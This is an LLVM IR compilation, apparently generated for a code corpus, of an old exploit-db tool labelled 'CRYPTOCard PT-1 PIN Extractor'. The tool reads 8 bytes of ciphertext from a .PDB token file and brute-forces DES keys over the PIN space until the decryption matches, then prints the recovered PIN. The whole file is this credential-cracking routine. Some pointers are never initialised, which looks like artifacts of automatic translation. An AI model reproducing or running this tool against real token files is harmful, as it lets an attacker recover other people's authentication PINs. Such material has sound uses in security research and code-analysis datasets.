; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19838.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19838.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@stdout = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [29 x i8] c"\0AUsage: %s <.PDB filename>\0A\0A\00", align 1
@.str.1 = private unnamed_addr constant [32 x i8] c"\0ACRYPTOCard PT-1 PIN Extractor\0A\00", align 1
@.str.2 = private unnamed_addr constant [21 x i8] c"kingpin@atstake.com\0A\00", align 1
@.str.3 = private unnamed_addr constant [28 x i8] c"@Stake L0pht Research Labs\0A\00", align 1
@.str.4 = private unnamed_addr constant [25 x i8] c"http://www.atstake.com\0A\0A\00", align 1
@.str.5 = private unnamed_addr constant [3 x i8] c"rb\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [25 x i8] c"Missing input file %s.\0A\0A\00", align 1
@SEEK_SET = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [35 x i8] c"Error getting ciphertext string.\0A\0A\00", align 1
@DES_DECRYPT = common dso_local global i32 0, align 4
@.str.8 = private unnamed_addr constant [10 x i8] c"\0A\0APIN: %d\00", align 1
@.str.9 = private unnamed_addr constant [2 x i8] c"#\00", align 1
@.str.10 = private unnamed_addr constant [3 x i8] c"\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32*, align 8
  %7 = alloca i32*, align 8
  %8 = alloca i32*, align 8
  %9 = alloca i32*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i64, align 8
  %12 = alloca i32*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32* inttoptr (i64 99 to i32*), i32** %9, align 8
  %13 = load i32, i32* %4, align 4
  %14 = icmp eq i32 %13, 1
  br i1 %14, label %15, label %21

15:                                               ; preds = %2
  %16 = load i32, i32* @stdout, align 4
  %17 = load i8**, i8*** %5, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 0
  %19 = load i8*, i8** %18, align 8
  %20 = call i32 (i32, i8*, ...) @fprintf(i32 %16, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str, i64 0, i64 0), i8* %19)
  store i32 1, i32* %3, align 4
  br label %120

21:                                               ; preds = %2
  %22 = load i32, i32* @stdout, align 4
  %23 = call i32 (i32, i8*, ...) @fprintf(i32 %22, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.1, i64 0, i64 0))
  %24 = load i32, i32* @stdout, align 4
  %25 = call i32 (i32, i8*, ...) @fprintf(i32 %24, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.2, i64 0, i64 0))
  %26 = load i32, i32* @stdout, align 4
  %27 = call i32 (i32, i8*, ...) @fprintf(i32 %26, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.3, i64 0, i64 0))
  %28 = load i32, i32* @stdout, align 4
  %29 = call i32 (i32, i8*, ...) @fprintf(i32 %28, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.4, i64 0, i64 0))
  %30 = load i8**, i8*** %5, align 8
  %31 = getelementptr inbounds i8*, i8** %30, i64 1
  %32 = load i8*, i8** %31, align 8
  %33 = call i32* @fopen(i8* %32, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  store i32* %33, i32** %12, align 8
  %34 = icmp eq i32* %33, null
  br i1 %34, label %35, label %41

35:                                               ; preds = %21
  %36 = load i32, i32* @stderr, align 4
  %37 = load i8**, i8*** %5, align 8
  %38 = getelementptr inbounds i8*, i8** %37, i64 1
  %39 = load i8*, i8** %38, align 8
  %40 = call i32 (i32, i8*, ...) @fprintf(i32 %36, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.6, i64 0, i64 0), i8* %39)
  store i32 1, i32* %3, align 4
  br label %120

41:                                               ; preds = %21
  %42 = load i32*, i32** %12, align 8
  %43 = load i32, i32* @SEEK_SET, align 4
  %44 = call i32 @fseek(i32* %42, i64 189, i32 %43)
  %45 = load i32*, i32** %6, align 8
  %46 = load i32*, i32** %12, align 8
  %47 = call i32 @fread(i32* %45, i32 1, i32 8, i32* %46)
  %48 = icmp ne i32 %47, 8
  br i1 %48, label %49, label %52

49:                                               ; preds = %41
  %50 = load i32, i32* @stderr, align 4
  %51 = call i32 (i32, i8*, ...) @fprintf(i32 %50, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.7, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %120

52:                                               ; preds = %41
  %53 = load i32*, i32** %12, align 8
  %54 = call i32 @fclose(i32* %53)
  %55 = load i32*, i32** %8, align 8
  %56 = getelementptr inbounds i32, i32* %55, i64 4
  store i32 36, i32* %56, align 4
  %57 = load i32*, i32** %8, align 8
  %58 = getelementptr inbounds i32, i32* %57, i64 5
  store i32 126, i32* %58, align 4
  %59 = load i32*, i32** %8, align 8
  %60 = getelementptr inbounds i32, i32* %59, i64 6
  store i32 62, i32* %60, align 4
  %61 = load i32*, i32** %8, align 8
  %62 = getelementptr inbounds i32, i32* %61, i64 7
  store i32 108, i32* %62, align 4
  store i64 0, i64* %11, align 8
  br label %63

63:                                               ; preds = %114, %52
  %64 = load i64, i64* %11, align 8
  %65 = icmp ult i64 %64, 900000000
  br i1 %65, label %66, label %117

66:                                               ; preds = %63
  %67 = load i64, i64* %11, align 8
  %68 = lshr i64 %67, 24
  %69 = and i64 %68, 255
  %70 = trunc i64 %69 to i32
  %71 = load i32*, i32** %8, align 8
  %72 = getelementptr inbounds i32, i32* %71, i64 0
  store i32 %70, i32* %72, align 4
  %73 = load i64, i64* %11, align 8
  %74 = lshr i64 %73, 16
  %75 = and i64 %74, 255
  %76 = trunc i64 %75 to i32
  %77 = load i32*, i32** %8, align 8
  %78 = getelementptr inbounds i32, i32* %77, i64 1
  store i32 %76, i32* %78, align 4
  %79 = load i64, i64* %11, align 8
  %80 = lshr i64 %79, 8
  %81 = and i64 %80, 255
  %82 = trunc i64 %81 to i32
  %83 = load i32*, i32** %8, align 8
  %84 = getelementptr inbounds i32, i32* %83, i64 2
  store i32 %82, i32* %84, align 4
  %85 = load i64, i64* %11, align 8
  %86 = and i64 %85, 255
  %87 = trunc i64 %86 to i32
  %88 = load i32*, i32** %8, align 8
  %89 = getelementptr inbounds i32, i32* %88, i64 3
  store i32 %87, i32* %89, align 4
  %90 = load i32, i32* %10, align 4
  %91 = call i32 @des_set_key(i32** %8, i32 %90)
  %92 = load i32, i32* %10, align 4
  %93 = load i32, i32* @DES_DECRYPT, align 4
  %94 = call i32 @des_ecb_encrypt(i32** %6, i32** %7, i32 %92, i32 %93)
  %95 = load i32*, i32** %7, align 8
  %96 = load i32*, i32** %9, align 8
  %97 = call i64 @memcmp(i32* %95, i32* %96, i32 8)
  %98 = icmp eq i64 %97, 0
  br i1 %98, label %99, label %104

99:                                               ; preds = %66
  %100 = load i32, i32* @stdout, align 4
  %101 = load i64, i64* %11, align 8
  %102 = udiv i64 %101, 9
  %103 = call i32 (i32, i8*, ...) @fprintf(i32 %100, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i64 0, i64 0), i64 %102)
  br label %117

104:                                              ; preds = %66
  %105 = load i64, i64* %11, align 8
  %106 = urem i64 %105, 900000
  %107 = icmp eq i64 %106, 0
  br i1 %107, label %108, label %113

108:                                              ; preds = %104
  %109 = load i32, i32* @stdout, align 4
  %110 = call i32 (i32, i8*, ...) @fprintf(i32 %109, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i64 0, i64 0))
  %111 = load i32, i32* @stdout, align 4
  %112 = call i32 @fflush(i32 %111)
  br label %113

113:                                              ; preds = %108, %104
  br label %114

114:                                              ; preds = %113
  %115 = load i64, i64* %11, align 8
  %116 = add i64 %115, 9
  store i64 %116, i64* %11, align 8
  br label %63

117:                                              ; preds = %99, %63
  %118 = load i32, i32* @stdout, align 4
  %119 = call i32 (i32, i8*, ...) @fprintf(i32 %118, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.10, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %120

120:                                              ; preds = %117, %49, %35, %15
  %121 = load i32, i32* %3, align 4
  ret i32 %121
}

declare dso_local i32 @fprintf(i32, i8*, ...) #1

declare dso_local i32* @fopen(i8*, i8*) #1

declare dso_local i32 @fseek(i32*, i64, i32) #1

declare dso_local i32 @fread(i32*, i32, i32, i32*) #1

declare dso_local i32 @fclose(i32*) #1

declare dso_local i32 @des_set_key(i32**, i32) #1

declare dso_local i32 @des_ecb_encrypt(i32**, i32**, i32, i32) #1

declare dso_local i64 @memcmp(i32*, i32*, i32) #1

declare dso_local i32 @fflush(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
